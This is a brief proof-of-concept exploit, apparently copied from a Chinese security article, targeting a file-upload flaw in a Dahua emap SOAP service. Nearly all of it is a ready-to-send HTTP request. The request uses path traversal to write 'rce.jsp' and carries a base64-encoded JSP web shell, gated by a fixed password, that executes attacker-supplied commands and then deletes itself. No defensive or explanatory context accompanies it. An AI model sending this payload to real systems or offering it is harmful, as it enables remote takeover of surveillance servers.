# dahua_bitmap_fileupload

from: https://mp.weixin.qq.com/s/OkZk0F9-uNQ1qekE7f-FUg
2024.2.19 @2
```
POST /emap/webservice/gis/soap/bitmap HTTP/1.1
Host: 127.0.0.1
Content-Type: text/xml; charset=utf-8
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
 
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
    <soapenv:Header/>           
      <soapenv:Body>
             <res:uploadPicFile>
                    <arg0>
                   <picPath>/../rce.jsp</picPath>
                    </arg0>
                    <arg1>PCUgaWYoIjEyMyIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkpeyBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7IGludCBhID0gLTE7IGJ5dGVbXSBiID0gbmV3IGJ5dGVbMjA0OF07IG91dC5wcmludCgiPHByZT4iKTsgd2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXsgb3V0LnByaW50bG4obmV3IFN0cmluZyhiKSk7IH0gb3V0LnByaW50KCI8L3ByZT4iKTsgfSAgb3V0LnByaW50bG4oIkhlbGxvIFdvcmxkISIpO25ldyBqYXZhLmlvLkZpbGUoYXBwbGljYXRpb24uZ2V0UmVhbFBhdGgocmVxdWVzdC5nZXRTZXJ2bGV0UGF0aCgpKSkuZGVsZXRlKCk7ICU+</arg1>
                </res:uploadPicFile>
    </soapenv:Body>
</soapenv:Envelope>
```
